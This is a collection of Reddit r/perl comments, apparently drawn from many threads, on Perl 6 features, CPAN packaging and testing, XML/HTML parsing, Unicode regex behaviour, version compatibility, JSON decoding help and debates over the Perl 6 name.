**Option type: Perl 6** There are as many null values as there are types, that is because every type is its own null. So all types are also their own option type. To opt into a non-nullable version of a type add the :D "smiley" to it. It is also possible to opt into a type that is only ever a nullable using the :U "smiley". Type "smileys" are used more often for methods and subroutines than they are for variables. *** ^[ [^PM](https://www.reddit.com/message/compose?to=kittens_from_space) ^| [^Exclude ^me](https://reddit.com/message/compose?to=WikiTextBot&amp;message=Excludeme&amp;subject=Excludeme) ^| [^Exclude ^from ^subreddit](https://np.reddit.com/r/perl/about/banned) ^| [^FAQ ^/ ^Information](https://np.reddit.com/r/WikiTextBot/wiki/index) ^] ^Downvote ^to ^remove ^| ^v0.21
Hi raiph. I'm pretty green on type theory in general, so maybe I'm misunderstanding all this Option type stuff, but something that a nullable type does not give me is the ability to store information (about the failure) inside it, which is why I used a `Failure` instead.
When this article comes up "around the water cooler" I would probably mention how environment factors in to these. Many years ago I had the impression that most perl users had root on the servers where their perl stuff was running in production. This means that the person planning on doing something in perl could more or less self-approve the use of the module which they had the skill to evaluate and install anyway. Fast-forward a decade or so and root on (large company) production servers is carefully guarded due to requirements like PCI/SOX/HIPAA and companies' experiences in having outages due to ad hoc platform management practices. Lots of people have been burned by CPAN/PEAR/PIP/etc. installs which installed a different version of some package than they already had in production. Companies start specifically approving the software that was permitted to run in production and restricting extra packages. (I'm aware that people should package the same version everywhere, as are you, how do you think this widespread awareness came about?) In this sort of environment anything that you would install with CPAN is an extra package and has extra hurdles to surmount, including the question "why do we need this when you could just spend extra time programming to complete your task?" A developer would need to file requests and go through extra processes just to get their pet custom library (you know, pets like JSON, SOAP::Lite, REST::Client) approved, never mind to start coding using it.
Excellent point. In this regard there is probably a huge difference between startups and more established companies.
Looks pretty cool, shame about the postfix conditional clashing
Afaict Damian's not trying to catch all of a P6 feature when he ports it, just something similar that's pleasing and useful in P5.
Same with FIRST phaser. I reported a bug with it firing in its place in code, rather at the start of iteration and turns out it's a limitation. 
the links to spvm on metacpan are all broken, they have some garbage between metacpan and .org
I like the idea behind Perl 11--build something like Perl5, but with a sensible grammar and VM. But Reini and Will (who seem to be the two big names on the list) have both proven before that they can't work with other people, even when they happen to be right. The project is simply too big for one or two people to do on their own.
* The "x" binary operator repeats a string a certain number of times. * The "length" function returns the length of a string in characters. * The ".=" operator appends to the end of a string. Put them together and you have... $field .= ('F' x (42 - length $field) );
`$field |= $field | ~$field &amp; "F"x42 ^ "F"x42`, naturally. `&amp;` is bitwise and, `|` is bitwise or, `^` is bitwise xor, `~` is bitwise complement. `&amp;` takes the length of its shorter argument while `|` and `^` take the length of the longer. So `$field | ~$field` produces a string of `0xFF` as long as `$field`. Anding that with `"F"x42` turns it into a string of `"F"` of the same length. Xoring it with `"F"x42` then produces a string of nulls as long as `$field` followed by enough `"F"` to make 42 in total. When you or that with `$field` itself, the nulls at the beginning leave the bytes of `$field` unchanged, and the `F`s at the end or with nothing, so they come out as `F`s, and then you have what you asked for. Never do this. Especially if `$field` is potentially non-ASCII. But now you learned something. :)
Thank you 
I recently had this issue as well and the worst part was it didn't make any sense. Here's what the problem was with mine: The file I was reading had been created on windows and I was using perl on BSD. Well, when I opened the file directly at the end of each line (in vi) was \^M. I tried chop, I tried chomp. No go. When I manually removed the \^M everything was back to standard and I didn't have any more troubles. Here's where I found the how to on removing the \^M: https://its.ucsc.edu/unix-timeshare/tutorials/clean-ctrl-m.html Hope that's it and you can get back to it! 
It's not that difficult. You need to register with PAUSE, and it makes sense to discuss your plan on the PAUSE mailing list. Read more at http://www.cpan.org/modules/04pause.html
That's not really relevant: Who makes the criticism is unimportant if the criticism itself can be self-evidently true. Many of the criticisms made by those people I consider valid, even if I disagree with their proposed solutions. Focusing on who made the criticism instead of the criticism itself is just a faulty authority appeal. Now, with that for context, you can read that list as a list of issues that Perl5 has (or at very least, is imagined to have) and this software advertises it has solutions to those problems. The validity of the problems and the utility of the solutions should stand on their own. If the claims are wrong, and the solutions aren't useful, well, we'll see won't we.
This could actually be really handy! I think it could use some TSV support, maybe I'll submit a patch.
No, the PAUSE mailing list is for work on PAUSE. The correct places to discuss new modules before upload are: * [module-authors](http://lists.perl.org/list/module-authors.html) * [Perlmonks](http://perlmonks.org/?node=Meditations) * [PrePAN](http://prepan.org/) Packaging advice, because the Makefile in OP's git repo is clearly insufficient: * &lt;https://stackoverflow.com/a/9716634/46395&gt; * &lt;https://stackoverflow.com/a/2606677/46395&gt; * `#toolchain` on the [MagNET](http://irc.perl.org/)
I don't disagree. I am simply stating that these are one person's opinions, not some "perl 11" organization, as there are not even author tags on most of the posts to indicate such. This can act as a "faulty authority appeal" itself.
I would just like to second the suggestion (for all prospective module authors) to join #toolchain on the perl IRC network to discuss and ask questions. There is a lot of cruft on perl's toolchain, and we are happy to help sort through it for you.
This can be a tricky situation. Generally if a test relies on an external service you should test for the presence, and skip the test if not available (see https://metacpan.org/pod/Test::More#Conditional-tests and the parts about skip_all). See if there's anything in your module functionality that you can test without the service being available. In general keep in mind that your tests will be run by hundreds of [random smoke boxes](http://cpantesters.org/) in addition to your regular users. (They usually set the env var AUTOMATED_TESTING so you can use that if you need to do something special for smokers.) For some things like PostgreSQL you can use a [mock server](https://metacpan.org/pod/Test::PostgreSQL) or [temporary database](https://metacpan.org/pod/DBIx::TempDB), don't know if either of those approaches is plausible for ZooKeeper. Another option to consider is to not even attempt the tests that require an external service unless a certain env var is provided, in cases where users might not appreciate the activity of the tests (so it would mostly be an author-run test). See for example the database tests of [Mojo::Pg](https://metacpan.org/source/SRI/Mojo-Pg-3.06/t/database.t#L7).
The location of the main pm file is wrong. It must be `lib/Net/ZooIt.pm`, not `lib/perl5/Net/ZooIt.pm`. Change the path declarations in the Makefile.PL, too. You also must [declare the dependencies](http://p3rl.org/ExtUtils::MakeMaker#PREREQ_PM) in the Makefile.PL. [scan_prereqs](http://p3rl.org/Perl::PrereqScanner::App) says: Carp = 0 Exporter = 0 Net::ZooKeeper = 0 POSIX = 0 Sys::Hostname = 0 Time::HiRes = 0 base = 0 feature = 0 strict = 0 warnings = 0 Install a [MANIFEST.SKIP](https://metacpan.org/source/ETHER/ExtUtils-Manifest-1.70/lib/ExtUtils/MANIFEST.SKIP) file in the base directory, add the line `^Net-ZooIt-` at the bottom and check the file into git. To cut a CPAN-ready release tarball from your repo, run `perl Makefile.PL; make manifest; make dist`.
 $line =~ /^HELLO\s(.*?)\s\./ 
Fun article. I've been playing with APL a bit lately, so it's nice to see you can write nice industry like code in Perl6 and still call some array programming algorithms when appropriate.
/(HELLO.+\S)\s\*\\.{10,}\s\*$/
Thanks for the advice. Went for a MANIFEST after all.
The name has a tortured history. It's originally [Mojo::DOM](https://metacpan.org/pod/Mojo::DOM) but some purists had issue with installing the entire [Mojolicious toolkit](https://metacpan.org/pod/Mojolicious) just for that module.
Want to know the funny thing about the web-activated garage door? If you use SSL with a strong password, it's probably more secure than your front door. If you use a crappy password, it's probably more secure than your front door.
I think it's pretty clear that $a, $b and $c are simply example variables.
Thanks for your detailed answer! 
I'll note that these are ways to implement full HTML lexers, and so are not really what people usually have in mind when they try to "parse HTML". Indeed, even the core of Mojo::DOM is a [regex lexer](https://metacpan.org/source/SRI/Mojolicious-7.33/lib/Mojo/DOM/HTML.pm#L10-41) (bonus: [lexer for CSS rules](https://metacpan.org/source/Mojo::DOM::CSS#L8-18)). In other words, regexes of course can be used to tokenize HTML for later processing; but finding specific things in HTML with regex is usually done incorrectly and is usually quite fragile.
&gt; If you limit your set to pure XML you might manage it though And indeed there's [MKDoc::XML](https://metacpan.org/source/BPOSTLE/MKDoc-XML-0.75/lib/MKDoc/XML/Tokenizer.pm). Okay, technically it's only tokenizing using regexes, but that has more to do with the fact that perl 5 regexes (especially back then) aren't great for *extracting* nested data, than with any difficulty in actually *matching* the recursive structure :)
There are some excellent XML parsers available. I can't think of a reason why I wouldn't use XML::Twig most of the time. And XML::LibXML the rest.
I think that's an appropriate name for something that looks awful and is stuck in 2001 era. Well done! 😗
Third option with (IMO) an even easier learning curve, [Mojo::DOM](https://metacpan.org/pod/Mojo::DOM). Also good if, like me, you know CSS much better than XPath. To use it for XML just initialize like this: my $dom = Mojo::DOM-&gt;new-&gt;xml(1)-&gt;parse($xml);
A weirder-still option is what I usually do in this situation. Having given up on XML entirely, I just pretend that the file is JSON instead. I use `XML::Simple` (_ducks_) to convert it to a Perl structure, and then JSON to convert it to JSON, and then I go through it with [jq] (https://stedolan.github.io/jq/).
Hello Thanks for the reply. Both files are in the same folder. 
No idea then. If you can share your code, perhaps more people could help.
I expect no less from rewrites.
Who tests the tests? EDIT: [Test::Fatal](https://metacpan.org/pod/Test::Fatal) is sometimes recommended instead. It provides an exception() function that is easy to use in conjunction with testing the resulting error message. Or if using the new [Test2::Suite](https://metacpan.org/pod/Test2::Suite), [Test2::Tools::Exception](https://metacpan.org/pod/Test2::Tools::Exception) (included in the standard bundle) provides a similar interface. But then, be careful that your check is not too specific or it might break due to changes in the error message.
It can be, but other times another module changing its error messages doesn't actually break your code in any way, just tests like these.
Much appreciated atsider, that was it. Cheers Joe
&gt; But then, be careful that your check is not too specific or it might break due to changes in the error message. It did bite me with Moo where the error message even depends on if XS accessors are used or not $ MOO_XS_DISABLE=1 perl -e 'package Local::X; use Moo; has x =&gt; (is =&gt; "ro"); package main; my $x = Local::X-&gt;new(); $x-&gt;x("test");' x is a read-only accessor at -e line 1. $ MOO_XS_DISABLE=0 perl -e 'package Local::X; use Moo; has x =&gt; (is =&gt; "ro"); package main; my $x = Local::X-&gt;new(); $x-&gt;x("test");' Usage: Local::X::x(self) at -e line 1. 
I looks to me Leon F. did not put much effort into research to come up with answers of his own. Talking to some people at a conference is the very least one can do, that's the wrong kind of lazy. I must be stupid to try to provide answers anyway. I also criticise the working back from a conclusion and seeking confirmation for his held beliefs; that may make for an entertaining blog rant, but the lack of open-mindedness does not lead into a good discussion to further learning or improvement. Also, Leon not observing the process closely, it's easy to say OMG 20 years OMG 20 years, but he couldn't have done it faster or better. &gt; what real need does Perl 6 solve? I've heard someone say its design is supposed to last (or was it withstand?) the next 100 years. Obviously, there are the Perl 6 RFCs from early 200x that enumerate dozens of real needs and the implementation adress them well. &gt; Why would I […] choose Perl 6 over any of the other languages that offer practical benefits? * &lt;http://blogs.perl.org/users/leon_timmermans/2010/04/why-perl-6-is-different.html&gt; * &lt;https://wendyga.wordpress.com/2015/12/25/why-would-you-want-to-use-perl-6-some-answers/&gt; * working interop with Perl 5/CPAN modules and a commitment to keeping it. (libperl being a C library can be embedded almost anywhere, but few languages/environments actually do. example: [node-perl](https://www.npmjs.com/package/perl) stopped working about two years ago) * lots of stuff built-in and backed by well-designed syntax where appropriate (analogy: mind how much better regex feel in Perl 5 because they're not just a library?), [rich in features](https://perl6.org/compilers/features) and more flexible to change syntax than most languages &gt; What niche does it fill? unique selling proposition: NFG text type, first class grammars &gt; What business problem does it solve for me? I can't answer that. Maybe it's too early to say? I invite the people who use Perl 6 in their business, there are few, to share their experience. Actually, I have a hard time answering this for many trendy programming languages, but that's a weak argument, isn't it. &gt; Pragmatically, how will it help me improve my skills and/or get a new job? IMO async/await being a central part makes one a better ES6 programmer, soon you'll want to replace callback style functions and direct use of .then/Promises API where possible. Likewise, knowing about many of the built-in concepts of Perl 6 installs a *name* in one's mind, e.g. "I should use a lazy list for this problem here so I do not exhaust memory, and this maps to a generator/library foo in language XYZ".
Sounds more like another reason to always use List::AllUtils :)
I can't reproduce your problem. Edit your post and show your actual code for path1.psgi and path2.psgi, trimmed down to the minimal amount that still exhibits the problem. http://sscce.org/
I don't have a problem with this new language, which goes by the name Perl 6. But it has a serious image problem. It could be the coolest new language out there, but as long as it has the name Perl, people are going to assume it's just a new version of the Perl they have already known, or that they have heard of. In short, from a PR perspective, Larry kept the worst part: the name. Perl 6 is so different from Perl 5 that it is worthy of a new name. A name that pulls people in, instead of driving people away. This new name could be anything. Anything except Perl. This language is certainly _Perl inspired_. But it is not Perl. It's an entirely different codebase, as we all know. And I'm not saying there's anything wrong with Perl 6, other than the name, and the assumption that any Perl 5 coder who doesn't embrace it is a fool. If I was going to learn a new language right now, it would be one that already has a decent amount of support, and with which you can actually get paying work. The assumption that the community of Perl developers is just going to follow, wherever the Perl name is carried, is flawed. Perl developers are going to keep using Perl, certainly, as long as it is the right tool for the job (and it often is). And yes, it is increasingly hard to justify using Perl in the current climate. But something called "Perl 6" is not going to change that.
Today I learned that someone has the last name Perl.
Oh, awesome. Yes, I should be able to. Thanks! 
&gt; &gt; &gt; To all the Perl 5 people who endlessly whine and troll the Perl 6 crowd, have you ever considered that the reason Perl 5 is, as OP puts it, "COBOL of 21st century" is because no one in their right mind would want to join the community of trolls and whiners? No, I'm sure that absolutely no one -- especially not people with decades of experience programming professionally, decades of experience with Perl, even multiple years of contributing to Perl itself and to code written in Perl that millions of people use and benefit from every day -- has *ever* considered that. Similarly, I wonder if any Rakudo developer has ever considered that the endless whining strawman of: &gt; Endless complaining that the world is grim and that Perl 6 is to blame for all the ills that have befallen. ... is seen as little more than an attempt to deflect from 17 years of overpromising and underdelivering? I mean, I look back on some of the awful arguments I made back a few years ago, and realize that the concerns I were waving away were true.
&gt; Also, Leon not observing the process closely, it's easy to say OMG 20 years OMG 20 years, but he couldn't have done it faster or better. This is a terrible argument.
Guys, thanks again, it's already on CPAN. https://metacpan.org/pod/release/SUBOGERO/Net-ZooIt-0.1/lib/Net/ZooIt.pm
&gt; And there's the double-header of "strawman" and "ad hominem" If you know a better way to respond to a discussion that's composed of nothing but logical fallacies, I'm open to hearing it. (Also I wrote "personal attack", not "ad hominem", because they're different.)
&gt; To all the Perl 5 people who endlessly whine and troll the Perl 6 crowd, Congratulations, any legitimate argument you may have had was just self-defeated. 
For future reference, if you hit 'reply' under the comment you're replying to instead of adding a new comment, it keeps the comment thread readable in order when things move around.
Please, try to see the irony here. The end of your comment is nothing but trolling and whining, and you are the only one here that thinks there is sufficient conflict to even bring up something like a language war. I only speak for myself but I hope that I have shown through example that I have no interest in trolling or disparaging the Perl 6 community, and only discuss reality.
&gt; Yesterday, a cartoon warrior disparaging Perl 6 was posted here. The post was also removed. Low-effort trolls gonna low-effort troll.
Thanks for the tip! I tried to create a repository with a test case
&gt; Edited a week later Not sure why you did that. You had a lot of good points in there. Here is a [breadcrumb for posterity](https://web-beta.archive.org/web/20170609062508/https://www.reddit.com/r/perl/comments/6ed9ot/perl5260_has_been_released/dif1pxe/?context=5)
Thanks very much for your helpful answer! (I did try to use categories but obviously I did it wrong..)
Other thing besides the name ( why didn't they called it "chainsaw" ? Everyone would be happier. ) If they are different languages why post perl6 in perl5 and vice versa ? Even this subreddit the description is: "The Perl Programming Language, including both Perl 5 and Perl 6." Had to register to post. lazy friday. Anyway, this is good news: "There are only two kinds of languages: the ones people complain about and the ones nobody uses" : )
**TL;DR** I recommend that readers simply ignore both my original comments and this one. But if you read my original comments, please also read the **Correction / Clarification** section of this one. #About removing my original comments &gt;&gt; I've deleted my comments as I now think they're likely to confuse many readers and unlikely to help any. &gt; Not sure why you did that. Because I found that no matter what less radical editing and/or elaboration I tried, I ended up with something I considered a poorer use of readers' time than just removing them and referring readers to the relevant section of the 5.26 delta. (Btw, in case you're wondering, I had already removed (edited) my reddit comments before I read and participated in the tweet thread that you started.) &gt; You had a lot of good points in there. Naturally I thought so too when I wrote them. :) But I also saw problems in what I'd written. Then /u/pre_action's comment drew my attention to yet another mistake I'd made and decided I needed to clean up the mess (imo) that I'd made. &gt; Here is a breadcrumb for posterity For posterity is cool. (&lt;3 archive.org!) Maybe we'll revisit my comments again in 2020? I still think they're less than helpful in 2017. Given that they're now undeleted as it were... # Correction / clarification Even though I suspect only 2 people in the world will ever read these comments, for my own sense of integrity I think the following bit in particular is too weak to stand without correction and clarification: &gt; that would mean they'd have to stick to 5.26 or 5.28 when 5.30 comes around, or start compiling their own patched perl, unless they or someone else has fixed the problem in the interim. Which means the decision to just use the environment variable only buys a couple years breathing space. For some scenarios it might be wiser to just stick with 5.14 or whatever older version you're currently on. First, I missed one of the most pertinent factors in the scenarios I was considering. From a maintenance / sys admin point of view, sitecustomize.pl provides a much simpler and more appropriate hook than rebuilding with a source code patch. In particular, aiui, many distros use this hook to shield end-users from breaking changes like this, and this renders the scenarios I was speaking of rarer than they already were. Second, the scenarios I was thinking of are rare, or at least I think so. They are when a maintainer knows that their system isn't currently vulnerable; and that it will be left running but effectively frozen and unmaintained by 2019; and that this aspect of security will be checked again prior to the freeze. Third, the scenarios where it might be "wiser to stick with 5.14 or whatever older version you're currently on" is a subset, perhaps a small one, of the already rare scenarios (afaik) that I just described in the previous paragraph.
While we're here, I'd be interested in any explanation you have about two points you made on twitter. First, you noted that `sitecustomize` has limits. I'm sure it does, but would you be willing to elaborate on which of these limits is relevant in the context of dropping support in, say, 5.30, for the unsafe inc environment variable? Much more importantly, you spoke of a "double-digit %age of the userbase" suffering from some "unlikely scenario". I rather doubt the scenario I was referring to is the one you were referring to, but regardless, I'm guessing that what you're saying about this humongous percentage is backed by some stats you've seen or calculated for some scenario. Would you be willing to share what that scenario is and your source of stats and/or your calculations?
Supporting 5.10 means primarily that you can't use the regex modifiers [/r](https://metacpan.org/pod/distribution/perl/pod/perlop.pod#s/PATTERN/REPLACEMENT/msixpodualngcer), [/a, /u, /d, or /l](https://metacpan.org/pod/perlre#Character-set-modifiers), or the [package BLOCK](https://metacpan.org/pod/perlfunc#package-NAMESPACE) syntax as these require perl 5.14. You also can't use [postderef](https://metacpan.org/pod/perlref#Postfix-Dereference-Syntax) as that requires perl 5.20. Most other added features are enabled via the [feature](https://metacpan.org/pod/feature) pragma or are experimental, so you probably wouldn't use them accidentally. Just avoid smartmatch (`~~`) and given/when (the 'switch' feature) as these were classified experimental in 5.18 and are extremely fragile. Autoderef (the ability to pass references to functions like `push` that normally take arrays or hashes) was also classified experimental and later removed; just dereference when passing to these functions to remain compatible. In general, you can find the changes in each major version in its [perldelta](https://metacpan.org/pod/perldelta), such as [perl5140delta](https://metacpan.org/pod/perl5140delta) for perl 5.14. But there are of course a lot of versions to wade through. It's certainly not required to write different scripts for different perl versions. Indeed the majority of modules on CPAN are built to run on every version from 5.10 to 5.26, and a lot of it supports 5.8 too. The one major restriction in CPAN modules you will be able to use on 5.10 are modules using the [keyword API](http://perldoc.perl.org/perlapi.html#PL_keyword_plugin) such as [Syntax::Keyword::Try](https://metacpan.org/pod/Syntax::Keyword::Try) or [Switch::Plain](https://metacpan.org/pod/Switch::Plain). The keyword API requires perl 5.14. But there are often alternatives with just a bit uglier syntax, like [Try::Tiny](https://metacpan.org/pod/Try::Tiny).
See the documentation of [feature](http://p3rl.org/feature) and [Syntax::Construct](http://p3rl.org/Syntax::Construct) if you don't want to go over all the perldeltas.
Brilliant response, thank you very much for the thorough break down of all of that. Based on this it seems multi-version compatibility won't be too hard then. I'll read up on those specific features, and docs you pointed out as well. Really appreciate the detail. Cheers!
That's a very helpful resource, thank you! 
I also found these two papers on PDL: [Managing econometric projects using Perl](http://onlinelibrary.wiley.com/doi/10.1002/jae.713/full) [PDL: an object-oriented programming environment for econometrics](http://onlinelibrary.wiley.com/doi/10.1002/jae.1096/full) 
Grinnz dropping serious knowledge here.
PDL is great. Been using it for over a decade (including contribs). 
The community maintains resources specific to older versions including: * Doc. If you follow just, say, [5.10.1 doc](http://perldoc.perl.org/5.10.1/index.html), you'll be shielded from exposure to changes that came later. * CPAN module testing. For example, [5.10.1 testing of CPAN modules](http://pass.cpantesters.org/perl_5.10.1.html).
The first is not completely true. Features and modules get deprecated or removed.
/u/Grinnz had the same point I was concerned about in the OP, backward and forward compatibility, which is potentially compromised when features are occasionally deprecated.
Thanks for correcting me and being polite about it. :)
&gt;:) I am happy that you are happy. Spread the happiness around. [This doggo demands it.](http://www.toyeskies.com/Abby_10wks_1.jpg)
As an alternative to the excellent advice you've already been given, I suggest you look at [perlbrew](https://metacpan.org/pod/distribution/App-perlbrew/lib/App/perlbrew.pm). Using perlbrew you'll be able to run more recent perls on all your platforms without interfering with their system perls (always a good idea).
I've already definitively dealt with the name issue: http://virtualsue.blogspot.de/2016/01/perl-names-logos-and-who-gets-to-decide.html?m=1
You might find this guide I wrote for work helpful - https://www.activestate.com/blog/2017/05/upgrading-perl-modern-version-activestate-guide - it goes over a lot of what changed from 5.8 to 5.24.
It's not necessary to use perlbrew to do this; [perl-build](https://metacpan.org/pod/distribution/Perl-Build/script/perl-build) just builds one perl which is ideal for deploying the same perl version on several machines, and [plenv](https://github.com/tokuhirom/plenv) is similar to perlbrew with better deployment features for multiple perls.
Brilliant, thank you! I'm reviewing this now.
Sure he has the right to do whatever he wants. That doesn't absolve them from being stupid decisions that have a negative effect on both Perl 5 and Perl 6 communities.
So if I'm understanding correctly, I could theoretically have a self-contained perl environment built for the latest version (5.26 at time of writing) copied into any system I connect to (and with minimal effort have removed upon exit)? This sounds intriguing, though much more labor/effort intensive. Sounds like it could be a very useful tool depending on how large the necessary plenv components would be, and how time consuming the environment build process would be.
Normally you would install a permanent, separate perl on such machines, as copying it each time would be a lot of overhead. Also keep in mind that perl, along with any XS modules, will only work on machines with the same architecture as where it was built. The deployment features I was referring to in plenv is mainly that you can pin an application directory to use a certain version of perl from plenv regardless of what you're using in the environment.
That's about what I figured. The plenv pinning is very helpful though. On the older systems with 2 perl versions installed, I can search for, and pin the newest of the two, help narrow my scope a bit.
Can you code it in python? 
Wait...does this mean I can throw R in the dumpster now, and use Perl for all the same purposes? 
api could be cleaned up. why does the user need to deal with ::Builder? they should only need to call -&gt;new(), optionally -&gt;insert(), and then -&gt;build(). also, why does your distribution have Set::IntervalTree and Text::XT (did you mean Test::XT?) as prereqs? and why use such an uncommon (in the perl world at least) serialization format? the mentioned perl module, Data::FlatTables, isn't even in cpan, and Set::FlatBuffer doesn't appear to exist anywhere.
Yes. What' is it worth to you? :D
Because Segment Trees are an immutable structure. You can't -&gt;insert into an immutable structure. I suppose I could make Set::SegmentTree the builder class, and have an alternative class for the actual 'type that is immutable', but I consider that a judgement call and a matter of the immutable principle that you can't mutate an immutable. You're dealing with a builder one way or the other regardless, and you can't query an unbuilt structure. Good catch on the extra Set::IntervalTree - must have been from when I first started messing with this module concept! And quite right, Test not Text. Repaired and pushed. FlatBuffers because my use case involves loading-and-querying in possibly an almost 1:1 ratio. Since other serialization forms require some level of parse overhead and FlatBuffers doesn't, it fits the use case better in my judgement.
PDL has been around since at least 2005 (when I first started using it), probably more. You did not have any "reasons" to use R to begin with.
Just so it's clear, this is working as intended and the exact same thing happens in Perl6: perl6 -e '.say if /\d/ for (^65535).map(*.chr)' | wc -l 370 Any Unicode code point with the `Nd` property will match. In Perl6 they also are correctly interpreted as numbers: perl6 -e 'say ߂ + ๓' 5 That's U+07C2 NKO DIGIT TWO summed to U+0E53 THAI DIGIT THREE.
`[0-9]` is the simplest backwards compatible fix; the `/a` modifier requires perl 5.14; and passing the result through Unicode::UCD::num() will turn it into a usable number in the rare case where you intended to accept input in other languages.
Yes, I don't understand what OP meant by "rarely what you want": if I want to accept any digit, I want to accept any digit.
So /\w/ won't match a whole bunch of unicode word characters, but /\d/ will match a whole bunch of unicode digits. I really hate unicode sometimes.
If you want to accept a US zip code or phone number, you don't want just any digit. If you want to accept postal codes or phone numbers in Canada or Western Europe, you still don't want just any digit. If you want to do any kind of math with what you get and expect Perl to give you a sensible result back, you don't want just any digit.
So ask for what you want instead of asking for any digit.
 perl -E 'binmode STDOUT, ":encoding(utf8)"; for (map { chr($_) } 1..65535) {say if /\w/ }'|wc -l 50477 Works for me. 
Which is exactly what this is about.
We're all in agreement.
I always thought that Perl 6 should have been renamed Camelia when it was officially released.
\w does indeed match unicode word characters as well. Similarly, [a-zA-Z0-9_] is a suitable substitute for the ascii version, but it's not usually as much of a problem, because high bit characters work fine in perl string operations.
I have yet to come across production code in Perl 5 actually intending to accept any digit. That's what it means.
At least [one of the ex-project managers has expressed similar thoughts](https://allisonrandal.com/2013/03/31/mythbusters-why-i-still-love-perl/).
Perl6 saved Perl5. Development was dead before the launch of Perl6 injected some life back into the old reliable.
I disagree, and that's also irrelevant. Perl 5 is being developed at the same rate as it was for years before the perl 6 release.
[...you should know what your data is. If you don't, then you've probably got bigger problems than \d not doing what you expect.](http://oylenshpeegul.typepad.com/blog/2010/10/great-scott-those-are-digits.html)
That's not really sufficient preparation anymore. Unicode strings can come from many sources, especially in web applications which usually work in unicode and use UTF-8 for transport automatically.
Nope, it had almost stopped and picked up only because Perl6 was announced. 
Sorry, I'm not going to continue this distraction from my point.
I though I was supposed to use : for my $img( @{$json-&gt;{'data'}{'images'}} ) { print $img-&gt;{'link'}; } but thats not working
Looks correct to me, what's not working? By the way this isn't really JSON anymore once it's decoded, just a standard perl data structure.
In the error logs it says: Can't call method "decode" on an undefined value at I then verified that there was a value for it to decode... 
That doesn't mean that the value you are passing is undefined, it means you are calling decode as a method on an undefined class/object. Perhaps you should show that part of the code.
 $imgur_url = "http://api.imgur.com/3/album/$id"; $ua = LWP::UserAgent-&gt;new; $ua-&gt;default_header('Authorization' =&gt; " Client-ID XXXXXXXXXX"); $response = $ua-&gt;get($imgur_url); $imgur_res = $response-&gt;decoded_content; $json-&gt;decode( $imgur_res ); for $img ( @{$json-&gt;{'data'}-&gt;{'images'}} ) { print $img-&gt;{'link'}; }
It doesn't decode in place; you decode the response (which is JSON text) into a perl data structure that is returned. So something like: use JSON::MaybeXS; # or JSON, but JSON::MaybeXS is better and drop-in replacement ... my $json = JSON-&gt;new; # normally you would enable the utf8 option, but -&gt;decoded_content already decodes from UTF-8 my $decoded = $json-&gt;decode($imgur_res); for my $img (@{$decoded-&gt;{data}{images}}) { ... } Also, you should use strict and warnings. They will [avoid and highlight](https://metacpan.org/pod/Perl::Critic::Policy::Freenode::StrictWarnings) many potential issues in your code.
Thank you sir, you just saved me an hour or two!! Greatly appreciated! 
Nice to see the call for funding got some responses. This was an excellent read. jnthn++
Tip: say "source: $source" if $source.defined; In Perl 6, you can save a bit of typing and use [`with`](https://docs.perl6.org/syntax/with%20orwith%20without) instead of `if … defined`, which also aliases to `$_`, so you can avoid the typo-prone variable repetition as well: say "source: $_" with $source; Or, if you like left-to-right direction more, use the [`andthen` operator](https://docs.perl6.org/routine/andthen): $source andthen say "source: $_"; 
Did you maybe try running \w against a string that was still UTF8-encoded?
If you are going to escape user input for HTML display, it should be done consistently, using something like [HTML::Entities](https://metacpan.org/pod/HTML::Entities) or [xml_escape in Mojo::Util](https://metacpan.org/pod/Mojo::Util#xml_escape), rather than the manual attempts shown here.
It should've been done *years* before first release. It's not just the language name that'd need to be renamed, you also have to move all the infrastructure and support channels. You can't have a Camelia that's supported via "perl6" RT queue, "#perl6" IRC channel, "perl6.org" website, and "perl6" github org. We already have the rename: Rakudo. And no one uses it. The name's ship sailed at least 6 years ago IMO. There's just no winning solution past that point.
You don't have to loop. my $data = decode_json($json); my @links = map { $_-&gt;{link} } @{$data-&gt;{images}}; Then do whatever you want with the `@links` array. RANT ALERT!!! About calling your data `$json` after parsing. It's anything but JSON. I'm constantly struggling with urges to pay mercenaries to go after people who make the impression that a simple hashref is a JSON string. Nine out of ten therapists advise against reading such code. If you call a hashref `$json` I bet your Python code is even more unreadable than your Perl.
Let's get the Perl5 - Perl6 flame out of the way, and let's talk about the future of Perl5. This future is anything but grim. Perl just went from the 10th to the 6th best paid IT job in one year's time. See the Stackoverflow survey. The financial sector is chock-full of Perl code and they are hiring. Perl5 still owns all your paradigms. For instance it's a very good functional language, if that's your cup of tea. I just went to a Scala training, and I was laughing to myself all the time how Scala is like Perl, but with strong types. Until the final day of the training, that is, when we learned about `implicit` whereby you can undo all the strong typing! Let's face it, Perl5 has everything: callbacks, recursion, higher-order functions, closures, pattern matching, even immutable data. Perl web frameworks didn't stop with Dancer. `node.js` needs an extension for routing, Python's Flask has no websockets or default non-blocking stuff. Mojolicious has them all out of the box. And JS really does need those ES6 Promises, because VanillaJS closures suck big time. Ever tried generating callbacks in a JS loop? And those bloody sigils allow us to interpolate into strings and regexes. They allow as to address a hash with a list, instead of writing a twice as long Python list comprehension. React's JSX invented here-documents, which we've been using for decades. So stop worrying and always look on the bright side of Perl.
The article isn't intended as a guide to how to escape entities in practice. It discusses a subtle bug which occurs when HTML entity escaping is done incorrectly. The "manual attempts shown here" are examples of something which creates the bug, not recommended ways to escape HTML entities. The bug itself is found in several CPAN modules. See [HTML::Scrubber](https://metacpan.org/source/NIGELM/HTML-Scrubber-0.17/lib/HTML/Scrubber.pm#L301) for example. I evaluated both the modules you suggest here, and they both use a `s/(entity_list)/substitute{$1}/g;` method which completely avoids the bug. See links here: [Mojo::Util](https://metacpan.org/source/SRI/Mojolicious-7.34/lib/Mojo/Util.pm#L314) [HTML::Entities](https://metacpan.org/source/GAAS/HTML-Parser-3.72/lib/HTML/Entities.pm#L462) I couldn't locate the exact location in the CPAN Ratings code, the other example of the bug mentioned in the blog post, where it escapes HTML entities. Edited to add links to /u/Grinnz's two suggested modules. 
And what did you assign to `$json`?
`\d` doesn't accept any digit. use utf8; if ('四' =~ /\d/) {print "Y\n"} else {print "N\n"} 
http://www.fileformat.info/info/unicode/char/56db/index.htm &gt; Character.isDigit() No ¯\\\_(ツ)\_/¯
Subscribe this youtube channel
Neat! Already taught a bot to give results for a report ID: &lt;Zoffix&gt; buggable: testers f878354a-6183-11e7-89a5-c5f577a92919 &lt;buggable&gt; Zoffix, Proc::Q:ver(1.001003) test result PASS. See more at http://api.cpantesters.org/v3/report/f878354a-6183-11e7-89a5-c5f577a92919 Is there a way to get reports by name of dist only, for Perl 6 dists?
How it's made: My bot scanned through all users that posted something in /r/perl and looked where else these users have posted stuff. It then generated this wordcloud based on that data. 
